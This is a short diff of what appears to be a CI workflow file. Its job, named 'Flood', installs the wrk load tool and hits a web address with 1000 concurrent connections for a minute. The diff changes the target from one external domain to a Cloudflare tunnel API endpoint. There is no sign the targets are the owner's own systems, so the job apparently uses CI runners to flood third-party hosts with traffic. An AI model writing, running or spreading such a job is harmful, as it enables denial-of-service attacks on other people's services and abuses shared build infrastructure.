@@ -7,4 +7,4 @@ jobs:
       - name: Flood
         run: |
           sudo apt-get install -y wrk
-          wrk -t 4 -c 1000 -d 1m https://gwbyte.eu.cc/
+          wrk -t 4 -c 1000 -d 1m http://technology-prefix-caused-games.trycloudflare.com/api/stat
